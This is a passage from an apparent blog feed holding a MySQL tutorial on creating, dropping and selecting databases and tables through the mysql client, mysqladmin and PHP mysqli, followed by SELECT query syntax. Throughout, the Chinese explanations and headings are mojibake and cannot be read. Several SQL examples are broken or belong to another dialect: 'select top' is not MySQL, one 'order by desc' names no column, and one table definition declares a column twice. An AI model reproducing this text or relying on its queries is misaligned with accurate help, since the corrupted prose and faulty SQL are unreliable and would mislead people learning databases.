class="hljs-string">&quot;&quot;&quot;å¿ƒå¦‚èŠ±æœ¨</span><span class="hljs-string">å‘é˜³è€Œç”Ÿ</span><span class="hljs-string">TAB ( \t )</span><span class="hljs-string">ä¹Ÿå¯ä»¥ä½¿ç”¨æ¢è¡Œç¬¦ [ \n ]</span><span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-keyword">print</span> (para_str)</code></pre><p>è¾“å‡ºå¦‚ä¸‹ï¼š</p><pre><code class="hljs less">å¿ƒå¦‚èŠ±æœ¨å‘é˜³è€Œç”Ÿ<span class="hljs-selector-tag">TAB</span> (  )ä¹Ÿå¯ä»¥ä½¿ç”¨æ¢è¡Œç¬¦ <span class="hljs-selector-attr">[ </span><span class="hljs-selector-attr"> ]</span></code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>MYSQL</title>
    <link href="/2020/10/18/MYSQL/"/>
    <url>/2020/10/18/MYSQL/</url>
    
    <content type="html"><![CDATA[<h1>MySQL</h1><ul><li><a href="#mysql">MySQL</a><ul><li><a href="#mysql%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%BA%93">MySQLåˆ›å»ºæ•°æ®åº“</a><ul><li><a href="#%E4%BD%BF%E7%94%A8-mysqladmin-%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%BA%93">ä½¿ç”¨ mysqladmin åˆ›å»ºæ•°æ®åº“</a></li><li><a href="#%E4%BD%BF%E7%94%A8-php%E8%84%9A%E6%9C%AC-%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%BA%93">ä½¿ç”¨ PHPè„šæœ¬ åˆ›å»ºæ•°æ®åº“</a></li></ul></li><li><a href="#mysql-%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE%E5%BA%93">MySQL åˆ é™¤æ•°æ®åº“</a><ul><li><a href="#drop-%E5%91%BD%E4%BB%A4%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE%E5%BA%93">drop å‘½ä»¤åˆ é™¤æ•°æ®åº“</a></li><li><a href="#%E4%BD%BF%E7%94%A8-mysqladmin-%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE%E5%BA%93">ä½¿ç”¨ mysqladmin åˆ é™¤æ•°æ®åº“</a></li><li><a href="#%E4%BD%BF%E7%94%A8php%E8%84%9A%E6%9C%AC%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE%E5%BA%93">ä½¿ç”¨PHPè„šæœ¬åˆ é™¤æ•°æ®åº“</a></li></ul></li><li><a href="#mysql-%E9%80%89%E6%8B%A9%E6%95%B0%E6%8D%AE%E5%BA%93">MySQL é€‰æ‹©æ•°æ®åº“</a><ul><li><a href="#%E4%BB%8E%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AA%97%E5%8F%A3%E4%B8%AD%E9%80%89%E6%8B%A9">ä»å‘½ä»¤æç¤ºçª—å£ä¸­é€‰æ‹©</a></li><li><a href="#%E4%BD%BF%E7%94%A8php%E8%84%9A%E6%9C%AC">ä½¿ç”¨PHPè„šæœ¬</a></li></ul></li><li><a href="#mysql-%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E8%A1%A8">MySQL åˆ›å»ºæ•°æ®è¡¨</a><ul><li><a href="#%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E5%88%9B%E5%BB%BA%E8%A1%A8">ä½¿ç”¨å‘½ä»¤æç¤ºç¬¦åˆ›å»ºè¡¨</a></li><li><a href="#%E4%BD%BF%E7%94%A8php%E8%84%9A%E6%9C%AC%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E8%A1%A8">ä½¿ç”¨PHPè„šæœ¬åˆ›å»ºæ•°æ®è¡¨</a></li></ul></li><li><a href="#mysql-%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE%E8%A1%A8">MySQL åˆ é™¤æ•°æ®è¡¨</a></li><li><a href="#mysql-%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE">MySQL åˆ é™¤æ•°æ®</a></li><li><a href="#mysql-%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE">MySQL æŸ¥è¯¢æ•°æ®</a><ul><li><a href="#%E9%80%9A%E8%BF%87%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6">é€šè¿‡å‘½ä»¤æç¤ºç¬¦</a></li><li><a href="#%E4%BD%BF%E7%94%A8php%E8%84%9A%E6%9C%AC-1">ä½¿ç”¨PHPè„šæœ¬</a></li></ul></li><li><a href="#mysql-%E6%8F%92%E5%85%A5%E6%95%B0%E6%8D%AE">MySQL æ’å…¥æ•°æ®</a><ul><li><a href="#%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AA%97%E5%8F%A3">å‘½ä»¤æç¤ºçª—å£</a></li></ul></li><li><a href="#mysql%E6%94%B9%E6%95%B0%E6%8D%AE">MySQLæ”¹æ•°æ®</a><br>æ•°æ®åº“æ˜¯æŒ‰ç…§æ•°æ®ç»“æ„æ¥ç»„ç»‡ã€å­˜å‚¨å’Œç®¡ç†æ•°æ®çš„ä»“åº“ã€‚æ¯ä¸ªæ•°æ®åº“éƒ½æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªä¸åŒçš„ API ç”¨äºåˆ›å»ºï¼Œè®¿é—®ï¼Œç®¡ç†ï¼Œæœç´¢å’Œå¤åˆ¶æ‰€ä¿å­˜çš„æ•°æ®ã€‚</li></ul></li></ul><p>å…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„ç‰¹ç‚¹ï¼š</p><ul><li>1.æ•°æ®ä»¥è¡¨æ ¼çš„å½¢å¼å‡ºç°</li><li>2.æ¯è¡Œä¸ºå„ç§è®°å½•åç§°</li><li>3.æ¯åˆ—ä¸ºè®°å½•åç§°æ‰€å¯¹åº”çš„æ•°æ®åŸŸ</li><li>4.è®¸å¤šçš„è¡Œå’Œåˆ—ç»„æˆä¸€å¼ è¡¨å•</li><li>5.è‹¥å¹²çš„è¡¨å•ç»„æˆdatabase</li></ul><h2 id="MySQLåˆ›å»ºæ•°æ®åº“"><a class="header-anchor" href="#MySQLåˆ›å»ºæ•°æ®åº“">ğŸ­</a>MySQLåˆ›å»ºæ•°æ®åº“</h2><p>ç®€å•å‘½ä»¤å¦‚ä¸‹ï¼šæ•°æ®åä¸ºBLACKPINK</p><pre><code class="hljs autoit">[root<span class="hljs-symbol">@host]</span><span class="hljs-meta"># mysql -u root -p   </span>Enter password:******  <span class="hljs-meta"># ç™»å½•åè¿›å…¥ç»ˆç«¯</span>mysql&gt; create DATABASE BLACKPINK<span class="hljs-comment">;</span></code></pre><h4 id="ä½¿ç”¨-mysqladmin-åˆ›å»ºæ•°æ®åº“"><a class="header-anchor" href="#ä½¿ç”¨-mysqladmin-åˆ›å»ºæ•°æ®åº“">ğŸ­</a>ä½¿ç”¨ mysqladmin åˆ›å»ºæ•°æ®åº“</h4><p>rootç”¨æˆ·æ‹¥æœ‰æœ€é«˜æƒé™ï¼Œå¯ä»¥ä½¿ç”¨ mysql <strong>mysqladmin</strong> å‘½ä»¤æ¥åˆ›å»ºæ•°æ®åº“ã€‚</p><pre><code class="hljs autoit">[root<span class="hljs-symbol">@host]</span><span class="hljs-meta"># mysqladmin -u root -p create BLACKPINK</span>Enter password:******</code></pre><p>ä¸Šè¿°å‘½ä»¤åˆ›å»º MySQL æ•°æ®åº“ BLACKPINKã€‚</p><h4 id="ä½¿ç”¨-PHPè„šæœ¬-åˆ›å»ºæ•°æ®åº“"><a class="header-anchor" href="#ä½¿ç”¨-PHPè„šæœ¬-åˆ›å»ºæ•°æ®åº“">ğŸ­</a>ä½¿ç”¨ PHPè„šæœ¬ åˆ›å»ºæ•°æ®åº“</h4><p>PHP ä½¿ç”¨ mysqli_query å‡½æ•°æ¥åˆ›å»ºæˆ–è€…åˆ é™¤ MySQL æ•°æ®åº“ã€‚</p><p>è¯­æ³•:</p><pre><code class="hljs reasonml">mysqli<span class="hljs-constructor">_query(<span class="hljs-params">connection</span>,<span class="hljs-params">query</span>,<span class="hljs-params">resultmode</span>)</span>;</code></pre><p>å®ä¾‹ï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$dbhost = <span class="hljs-string">&#x27;localhost&#x27;</span>;  <span class="hljs-comment">// mysqlæœåŠ¡å™¨ä¸»æœºåœ°å€</span>$dbuser = <span class="hljs-string">&#x27;root&#x27;</span>;            <span class="hljs-comment">// mysqlç”¨æˆ·å</span>$dbpass = <span class="hljs-string">&#x27;123456&#x27;</span>;          <span class="hljs-comment">// mysqlç”¨æˆ·åå¯†ç </span>$conn = mysqli_connect($dbhost, $dbuser, $dbpass);<span class="hljs-keyword">if</span>(! $conn )&#123;  <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;è¿æ¥é”™è¯¯: &#x27;</span> . mysqli_error($conn));&#125;<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;è¿æ¥æˆåŠŸ&lt;br /&gt;&#x27;</span>;$sql = <span class="hljs-string">&#x27;CREATE DATABASE BLACKPINK&#x27;</span>;$retval = mysqli_query($conn,$sql );<span class="hljs-keyword">if</span>(! $retval )&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;åˆ›å»ºæ•°æ®åº“å¤±è´¥: &#x27;</span> . mysqli_error($conn));&#125;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æ•°æ®åº“ BLACKPINK åˆ›å»ºæˆåŠŸ\n&quot;</span>;mysqli_close($conn);<span class="hljs-meta">?&gt;</span></code></pre><h2 id="MySQL-åˆ é™¤æ•°æ®åº“"><a class="header-anchor" href="#MySQL-åˆ é™¤æ•°æ®åº“">ğŸ­</a>MySQL åˆ é™¤æ•°æ®åº“</h2><h4 id="drop-å‘½ä»¤åˆ é™¤æ•°æ®åº“"><a class="header-anchor" href="#drop-å‘½ä»¤åˆ é™¤æ•°æ®åº“">ğŸ­</a>drop å‘½ä»¤åˆ é™¤æ•°æ®åº“</h4><p>è¯­æ³•å¦‚ä¸‹:</p><pre><code class="hljs n1ql">mysql&gt; <span class="hljs-keyword">drop</span> <span class="hljs-keyword">database</span> æ•°æ®åº“å;</code></pre><h4 id="ä½¿ç”¨-mysqladmin-åˆ é™¤æ•°æ®åº“"><a class="header-anchor" href="#ä½¿ç”¨-mysqladmin-åˆ é™¤æ•°æ®åº“">ğŸ­</a>ä½¿ç”¨ mysqladmin åˆ é™¤æ•°æ®åº“</h4><pre><code class="hljs autoit">[root<span class="hljs-symbol">@host]</span><span class="hljs-meta"># mysqladmin -u root -p drop BLACKPINK</span>Enter password:******</code></pre><p>æ‰§è¡Œä»¥ä¸Šåˆ é™¤æ•°æ®åº“å‘½ä»¤åï¼Œä¼šå‡ºç°ä¸€ä¸ªæç¤ºæ¡†ï¼Œæ¥ç¡®è®¤æ˜¯å¦çœŸçš„åˆ é™¤æ•°æ®åº“ã€‚</p><h4 id="ä½¿ç”¨PHPè„šæœ¬åˆ é™¤æ•°æ®åº“"><a class="header-anchor" href="#ä½¿ç”¨PHPè„šæœ¬åˆ é™¤æ•°æ®åº“">ğŸ­</a>ä½¿ç”¨PHPè„šæœ¬åˆ é™¤æ•°æ®åº“</h4><p>è¯¥å‘½ä»¤ä¸åˆ›å»ºç±»ä¼¼ï¼Œä¸åŒåœ°æ–¹åœ¨åˆ›å»ºæ—¶</p><pre><code class="hljs arcade"><span class="hljs-symbol">$s</span>ql = <span class="hljs-string">&#x27;CREATE DATABASE BLACKPINK&#x27;</span>;</code></pre><p>åœ¨åˆ é™¤æ—¶å˜ä¸º</p><pre><code class="hljs arcade"><span class="hljs-symbol">$s</span>ql = <span class="hljs-string">&#x27;DROP DATABASE BLACKPINK&#x27;</span>;</code></pre><p><strong>ä½†åœ¨ä½¿ç”¨PHPè„šæœ¬åˆ é™¤æ•°æ®åº“æ—¶ä¸ä¼šå‡ºç°ç¡®è®¤æ˜¯å¦åˆ é™¤ä¿¡æ¯ï¼Œä¼šç›´æ¥åˆ é™¤æŒ‡å®šæ•°æ®åº“ã€‚</strong></p><h2 id="MySQL-é€‰æ‹©æ•°æ®åº“"><a class="header-anchor" href="#MySQL-é€‰æ‹©æ•°æ®åº“">ğŸ­</a>MySQL é€‰æ‹©æ•°æ®åº“</h2><h4 id="ä»å‘½ä»¤æç¤ºçª—å£ä¸­é€‰æ‹©"><a class="header-anchor" href="#ä»å‘½ä»¤æç¤ºçª—å£ä¸­é€‰æ‹©">ğŸ­</a>ä»å‘½ä»¤æç¤ºçª—å£ä¸­é€‰æ‹©</h4><p>å‘½ä»¤å¦‚ä¸‹ï¼š</p><pre><code class="hljs elixir">[root<span class="hljs-variable">@host</span>]<span class="hljs-comment"># mysql -u root -p</span>Enter <span class="hljs-symbol">password:</span>******mysql&gt; <span class="hljs-keyword">use</span> BLACKPINK;Database changedmysql&gt;</code></pre><p><strong>æ‰€æœ‰çš„æ•°æ®åº“åï¼Œè¡¨åï¼Œè¡¨å­—æ®µéƒ½æ˜¯åŒºåˆ†å¤§å°å†™çš„ã€‚</strong></p><h4 id="ä½¿ç”¨PHPè„šæœ¬"><a class="header-anchor" href="#ä½¿ç”¨PHPè„šæœ¬">ğŸ­</a>ä½¿ç”¨PHPè„šæœ¬</h4><p>è¯­æ³•å¦‚ä¸‹ï¼š</p><pre><code class="hljs reasonml">mysqli<span class="hljs-constructor">_select_db(<span class="hljs-params">connection</span>,<span class="hljs-params">dbname</span>)</span>;</code></pre><p>å®ä¾‹ï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$dbhost = <span class="hljs-string">&#x27;localhost&#x27;</span>;  <span class="hljs-comment">// mysqlæœåŠ¡å™¨ä¸»æœºåœ°å€</span>$dbuser = <span class="hljs-string">&#x27;root&#x27;</span>;            <span class="hljs-comment">// mysqlç”¨æˆ·å</span>$dbpass = <span class="hljs-string">&#x27;123456&#x27;</span>;          <span class="hljs-comment">// mysqlç”¨æˆ·åå¯†ç </span>$conn = mysqli_connect($dbhost, $dbuser, $dbpass);<span class="hljs-keyword">if</span>(! $conn )&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;è¿æ¥å¤±è´¥: &#x27;</span> . mysqli_error($conn));&#125;<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;è¿æ¥æˆåŠŸ&#x27;</span>;mysqli_select_db($conn, <span class="hljs-string">&#x27;BLACKPINK&#x27;</span> );mysqli_close($conn);<span class="hljs-meta">?&gt;</span></code></pre><h2 id="MySQL-åˆ›å»ºæ•°æ®è¡¨"><a class="header-anchor" href="#MySQL-åˆ›å»ºæ•°æ®è¡¨">ğŸ­</a>MySQL åˆ›å»ºæ•°æ®è¡¨</h2><p>è¯­æ³•ï¼š</p><pre><code class="hljs pgsql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-built_in">table_name</span> (<span class="hljs-built_in">column_name</span> column_type);</code></pre><p>å®ä¾‹:</p><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-keyword">IF</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> <span class="hljs-string">`blackpink_tbl`</span>(   <span class="hljs-string">`blackpink_id`</span> <span class="hljs-built_in">INT</span> <span class="hljs-keyword">UNSIGNED</span> AUTO_INCREMENT,   <span class="hljs-string">`blackpink_title`</span> <span class="hljs-built_in">VARCHAR</span>(<span class="hljs-number">100</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span>,   <span class="hljs-string">`blackpink_author`</span> <span class="hljs-built_in">VARCHAR</span>(<span class="hljs-number">40</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span>,   <span class="hljs-string">`submission_date`</span> <span class="hljs-built_in">DATE</span>,   PRIMARY <span class="hljs-keyword">KEY</span> ( <span class="hljs-string">`blackpink_id`</span> ))<span class="hljs-keyword">ENGINE</span>=<span class="hljs-keyword">InnoDB</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">CHARSET</span>=utf8;</code></pre><ul><li>AUTO_INCREMENTå®šä¹‰åˆ—ä¸ºè‡ªå¢çš„å±æ€§ï¼Œä¸€èˆ¬ç”¨äºä¸»é”®ï¼Œæ•°å€¼ä¼šè‡ªåŠ¨åŠ 1ã€‚</li><li>PRIMARY KEYå…³é”®å­—ç”¨äºå®šä¹‰åˆ—ä¸ºä¸»é”®ã€‚ å¯ä»¥ä½¿ç”¨å¤šåˆ—æ¥å®šä¹‰ä¸»é”®ï¼Œåˆ—é—´ä»¥é€—å·åˆ†éš”ã€‚</li><li>ENGINE è®¾ç½®å­˜å‚¨å¼•æ“ï¼ŒCHARSET è®¾ç½®ç¼–ç ã€‚</li></ul><h4 id="ä½¿ç”¨å‘½ä»¤æç¤ºç¬¦åˆ›å»ºè¡¨"><a class="header-anchor" href="#ä½¿ç”¨å‘½ä»¤æç¤ºç¬¦åˆ›å»ºè¡¨">ğŸ­</a>ä½¿ç”¨å‘½ä»¤æç¤ºç¬¦åˆ›å»ºè¡¨</h4><pre><code class="hljs routeros">root@host# mysql -u root -pEnter password:*******mysql&gt; use BLACKPINK;Database changedmysql&gt; CREATE TABLE runoob_tbl(   blackpink_id INT <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span> AUTO_INCREMENT,   blackpink_title VARCHAR(100) <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span>,   blackpink_author VARCHAR(40) <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span>,   submission_date DATE,   PRIMARY KEY ( blackpink_id )   )<span class="hljs-attribute">ENGINE</span>=InnoDB<span class="hljs-built_in"> DEFAULT </span><span class="hljs-attribute">CHARSET</span>=utf8;Query OK, 0 rows affected (0.16 sec)mysql&gt;</code></pre><h4 id="ä½¿ç”¨PHPè„šæœ¬åˆ›å»ºæ•°æ®è¡¨"><a class="header-anchor" href="#ä½¿ç”¨PHPè„šæœ¬åˆ›å»ºæ•°æ®è¡¨">ğŸ­</a>ä½¿ç”¨PHPè„šæœ¬åˆ›å»ºæ•°æ®è¡¨</h4><p>ä¸åˆ›å»ºæ•°æ®åº“ç±»ä¼¼ï¼Œå°†$sqlå¤„ä»£ç æ¢æˆå¦‚ä¸‹:</p><pre><code class="hljs sql">$sql = &quot;<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> blackpink_tbl( <span class="hljs-string">&quot;.</span><span class="hljs-string">        &quot;</span>blackpink_id <span class="hljs-built_in">INT</span> <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span> AUTO_INCREMENT, <span class="hljs-string">&quot;.</span><span class="hljs-string">        &quot;</span>blackpink <span class="hljs-built_in">VARCHAR</span>(<span class="hljs-number">100</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;.</span><span class="hljs-string">        &quot;</span>blackpink <span class="hljs-built_in">VARCHAR</span>(<span class="hljs-number">40</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;.</span><span class="hljs-string">        &quot;</span>submission_date <span class="hljs-built_in">DATE</span>, <span class="hljs-string">&quot;.</span><span class="hljs-string">        &quot;</span>PRIMARY <span class="hljs-keyword">KEY</span> ( blackpink_id ))<span class="hljs-keyword">ENGINE</span>=<span class="hljs-keyword">InnoDB</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">CHARSET</span>=utf8; &quot;;mysqli_select_db( $conn, &#x27;blackpink&#x27; );</code></pre><h2 id="MySQL-åˆ é™¤æ•°æ®è¡¨"><a class="header-anchor" href="#MySQL-åˆ é™¤æ•°æ®è¡¨">ğŸ­</a>MySQL åˆ é™¤æ•°æ®è¡¨</h2><p>è¯­æ³•ä¸åˆ›å»ºæ•°æ®è¡¨ç±»ä¼¼ï¼Œå°†createæ¢æˆdropå³å¯ã€‚</p><h2 id="MySQL-åˆ é™¤æ•°æ®"><a class="header-anchor" href="#MySQL-åˆ é™¤æ•°æ®">ğŸ­</a>MySQL åˆ é™¤æ•°æ®</h2><p>åˆ é™¤&lt;æ»¡è¶³æ¡ä»¶çš„&gt;è¡Œ</p><pre><code class="hljs n1ql"><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> &lt;è¡¨å&gt; [<span class="hljs-keyword">where</span> &lt;åˆ é™¤æ¡ä»¶&gt;]</code></pre><h2 id="MySQL-æŸ¥è¯¢æ•°æ®"><a class="header-anchor" href="#MySQL-æŸ¥è¯¢æ•°æ®">ğŸ­</a>MySQL æŸ¥è¯¢æ•°æ®</h2><p>è¯­æ³•å¦‚ä¸‹:</p><pre><code class="hljs markdown">SELECT column<span class="hljs-emphasis">_name,column_</span>nameFROM table<span class="hljs-emphasis">_name</span><span class="hljs-emphasis">[WHERE Clause]</span><span class="hljs-emphasis">[<span class="hljs-string">LIMIT N</span>][<span class="hljs-symbol"> OFFSET M</span>]</span></code></pre><ul><li><p>æŸ¥è¯¢è¯­å¥å¯ä»¥ä½¿ç”¨ä¸€ä¸ªæˆ–è€…å¤šä¸ªè¡¨ï¼Œè¡¨ä¹‹é—´ä½¿ç”¨é€—å·åˆ†éš”ã€‚</p></li><li><p>SELECT å¯ä»¥è¯»å–ä¸€æ¡æˆ–è€…å¤šæ¡è®°å½•ã€‚</p></li><li><p>ä½¿ç”¨ WHERE è¯­å¥æ¥åŒ…å«ä»»ä½•æ¡ä»¶ã€‚</p></li><li><p>ä½¿ç”¨ LIMIT å±æ€§æ¥è®¾å®šè¿”å›çš„è®°å½•æ•°ã€‚</p></li><li><p>é€šè¿‡OFFSETæŒ‡å®šSELECTè¯­å¥å¼€å§‹æŸ¥è¯¢çš„æ•°æ®åç§»é‡(é»˜è®¤æƒ…å†µä¸‹åç§»é‡ä¸º0)</p></li></ul><h4 id="é€šè¿‡å‘½ä»¤æç¤ºç¬¦"><a class="header-anchor" href="#é€šè¿‡å‘½ä»¤æç¤ºç¬¦">ğŸ­</a>é€šè¿‡å‘½ä»¤æç¤ºç¬¦</h4><pre><code class="hljs pgsql"><span class="hljs-number">1.</span>ç²¾ç¡®ï¼ˆæ¡ä»¶ï¼‰æŸ¥è¯¢<span class="hljs-keyword">select</span> &lt;åˆ—å&gt; <span class="hljs-keyword">from</span> &lt;è¡¨å&gt; [<span class="hljs-keyword">where</span> &lt;æŸ¥è¯¢æ¡ä»¶è¡¨è¾¾è¯•&gt;] [<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> &lt;æ’åºçš„åˆ—å&gt;[<span class="hljs-keyword">asc</span>æˆ–<span class="hljs-keyword">desc</span>]]<span class="hljs-number">2.</span>æŸ¥è¯¢æ‰€æœ‰æ•°æ®è¡Œå’Œåˆ—<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> &lt;è¡¨&gt;<span class="hljs-number">3.</span>æŸ¥è¯¢éƒ¨åˆ†è¡Œåˆ—<span class="hljs-comment">--æ¡ä»¶æŸ¥è¯¢</span><span class="hljs-keyword">select</span> i,j,k <span class="hljs-keyword">from</span> a <span class="hljs-keyword">where</span> f=<span class="hljs-number">5</span>//æŸ¥è¯¢è¡¨aä¸­f=<span class="hljs-number">5</span>çš„æ‰€æœ‰è¡Œï¼Œå¹¶æ˜¾ç¤ºi,j,kï¼“åˆ—<span class="hljs-number">4.</span>åœ¨æŸ¥è¯¢ä¸­ä½¿ç”¨ï¼¡ï¼³æ›´æ”¹åˆ—å<span class="hljs-keyword">select</span> <span class="hljs-type">name</span> <span class="hljs-keyword">as</span> å§“å <span class="hljs-keyword">from</span> a <span class="hljs-keyword">where</span> xingbie=<span class="hljs-string">&#x27;ç”·&#x27;</span>//æŸ¥è¯¢aè¡¨ä¸­æ€§åˆ«ä¸ºç”·çš„æ‰€æœ‰è¡Œï¼Œæ˜¾ç¤º<span class="hljs-type">name</span>åˆ—ï¼Œå¹¶å°†<span class="hljs-type">name</span>åˆ—æ”¹åä¸ºï¼ˆå§“åï¼‰æ˜¾ç¤º<span class="hljs-number">5.</span>æŸ¥è¯¢ç©ºè¡Œ<span class="hljs-keyword">select</span> <span class="hljs-type">name</span> <span class="hljs-keyword">from</span> a <span class="hljs-keyword">where</span> email <span class="hljs-keyword">is</span> <span class="hljs-keyword">null</span>//æŸ¥è¯¢è¡¨aä¸­emailä¸ºç©ºçš„æ‰€æœ‰è¡Œï¼Œå¹¶æ˜¾ç¤º<span class="hljs-type">name</span>åˆ—ï¼›<span class="hljs-keyword">SQL</span>è¯­å¥ä¸­ç”¨<span class="hljs-keyword">is</span> <span class="hljs-keyword">null</span>æˆ–è€…<span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>æ¥åˆ¤æ–­æ˜¯å¦ä¸ºç©ºè¡Œ<span class="hljs-number">6.</span>åœ¨æŸ¥è¯¢ä¸­ä½¿ç”¨å¸¸é‡<span class="hljs-keyword">select</span> <span class="hljs-type">name</span>, <span class="hljs-string">&#x27;å”å±±&#x27;</span> <span class="hljs-keyword">as</span> åœ°å€ <span class="hljs-keyword">from</span> Student//æŸ¥è¯¢è¡¨aï¼Œæ˜¾ç¤º<span class="hljs-type">name</span>åˆ—ï¼Œå¹¶æ·»åŠ åœ°å€åˆ—ï¼Œå…¶åˆ—å€¼éƒ½ä¸º<span class="hljs-string">&#x27;å”å±±&#x27;</span><span class="hljs-number">7.</span>æŸ¥è¯¢è¿”å›é™åˆ¶è¡Œæ•°<span class="hljs-keyword">select</span> top <span class="hljs-number">6</span> <span class="hljs-type">name</span> <span class="hljs-keyword">from</span> a//æŸ¥è¯¢è¡¨aï¼Œæ˜¾ç¤ºåˆ—<span class="hljs-type">name</span>çš„å‰ï¼–è¡Œï¼Œtopä¸ºå…³é”®å­—<span class="hljs-keyword">select</span> top <span class="hljs-number">60</span> percent <span class="hljs-type">name</span> <span class="hljs-keyword">from</span> a//æŸ¥è¯¢è¡¨aï¼Œæ˜¾ç¤ºåˆ—<span class="hljs-type">name</span>çš„<span class="hljs-number">60</span>%ï¼Œpercentä¸ºå…³é”®å­—<span class="hljs-number">8.</span>æŸ¥è¯¢æ’åºï¼ˆå…³é”®å­—ï¼š<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> , <span class="hljs-keyword">asc</span> , <span class="hljs-keyword">desc</span>ï¼‰ä¾‹ï¼š<span class="hljs-keyword">select</span> <span class="hljs-type">name</span> <span class="hljs-keyword">from</span> a <span class="hljs-keyword">where</span> chengji&gt;=<span class="hljs-number">60</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-keyword">desc</span>//æŸ¥è¯¢aè¡¨ä¸­chengjiå¤§äºç­‰äº<span class="hljs-number">60</span>çš„æ‰€æœ‰è¡Œï¼Œå¹¶æŒ‰é™åºæ˜¾ç¤º<span class="hljs-type">name</span>åˆ—ï¼›é»˜è®¤ä¸ºï¼¡ï¼³ï¼£å‡åº<span class="hljs-number">9.</span>æ¨¡ç³ŠæŸ¥è¯¢ä½¿ç”¨<span class="hljs-keyword">like</span>è¿›è¡Œæ¨¡ç³ŠæŸ¥è¯¢æ³¨æ„ï¼š<span class="hljs-keyword">like</span>è¿ç®—å‰¯åªç”¨äºå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥ä»…ä¸<span class="hljs-type">char</span>å’Œ<span class="hljs-type">varchar</span>æ•°æ®ç±»å‹è”åˆä½¿ç”¨<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> a <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;èµµ%&#x27;</span>//æŸ¥è¯¢æ˜¾ç¤ºè¡¨aä¸­ï¼Œ<span class="hljs-type">name</span>å­—æ®µç¬¬ä¸€ä¸ªå­—ä¸ºèµµçš„è®°å½•ä½¿ç”¨<span class="hljs-keyword">between</span>åœ¨æŸä¸ªèŒƒå›´å†…è¿›è¡ŒæŸ¥è¯¢<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> a <span class="hljs-keyword">where</span> nianling <span class="hljs-keyword">between</span> <span class="hljs-number">18</span> <span class="hljs-keyword">and</span> <span class="hljs-number">20</span>//æŸ¥è¯¢æ˜¾ç¤ºè¡¨aä¸­nianlingåœ¨<span class="hljs-number">18</span>åˆ°<span class="hljs-number">20</span>ä¹‹é—´çš„è®°å½•ä½¿ç”¨<span class="hljs-keyword">in</span>åœ¨åˆ—ä¸¾å€¼å†…è¿›è¡ŒæŸ¥è¯¢<span class="hljs-keyword">select</span> <span class="hljs-type">name</span> <span class="hljs-keyword">from</span> a <span class="hljs-keyword">where</span> address <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;åŒ—äº¬&#x27;</span>,<span class="hljs-string">&#x27;ä¸Šæµ·&#x27;</span>,<span class="hljs-string">&#x27;å”å±±&#x27;</span>)//æŸ¥è¯¢è¡¨aä¸­addresså€¼ä¸ºåŒ—äº¬æˆ–è€…ä¸Šæµ·æˆ–è€…å”å±±çš„è®°å½•ï¼Œæ˜¾ç¤º<span class="hljs-type">name</span>å­—æ®µ<span class="hljs-number">10.</span>åˆ†ç»„æŸ¥è¯¢ä½¿ç”¨<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span>è¿›è¡Œåˆ†ç»„æŸ¥è¯¢<span class="hljs-keyword">select</span> studentID <span class="hljs-keyword">as</span> å­¦å‘˜ç¼–å·,AVG(score) <span class="hljs-keyword">as</span> å¹³å‡æˆç»© 